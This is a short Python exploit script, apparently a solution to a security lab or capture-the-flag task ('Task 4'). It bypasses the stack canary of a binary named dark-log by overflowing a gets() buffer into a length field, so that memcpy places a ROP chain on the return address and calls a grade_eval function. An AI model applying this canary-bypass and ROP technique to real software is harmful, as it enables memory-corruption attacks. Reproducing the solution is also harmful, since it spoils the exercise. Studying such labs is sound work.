#!/usr/bin/env python3
"""Task 4: Canary bypass on dark-log.

dark-log has stack canary enabled. The attack bypasses canary by:
1. gets() overflows expression into logMsg and len fields
2. Setting len = 0xa8 makes memcpy write to rbp+0x08 (return addr)
3. This bypasses the canary at rbp-0x08 (memcpy writes ABOVE canary)
4. ROP chain in expression is copied to return address area

Gadgets:
  pop rdi; ret at 0x4018a3 (unaligned: 41 5f c3 -> 5f c3)
  grade_eval at 0x401677
"""
import sys
import struct

pop_rdi_ret = 0x4018a3
grade_eval = 0x401677

# ROP chain placed at start of expression (will be copied to rbp+0x08 by memcpy)
rop = (
    struct.pack("<Q", pop_rdi_ret)   # [rbp+0x08] return addr -> pop rdi; ret
    + struct.pack("<Q", 4)           # [rbp+0x10] rdi = 4
    + struct.pack("<Q", grade_eval)  # [rbp+0x18] call grade_eval
)

# expression: 128 bytes (ROP chain + padding)
expr = rop + b"C" * (128 - len(rop))

# logMsg: 128 bytes (gets overflow fills this gap)
logMsg = b"D" * 128

# len: 4 bytes at offset 0x100 from expression start. Set to 0xa8 = 168
length = struct.pack("<I", 0xa8)

payload = expr + logMsg + length
sys.stdout.buffer.write(payload)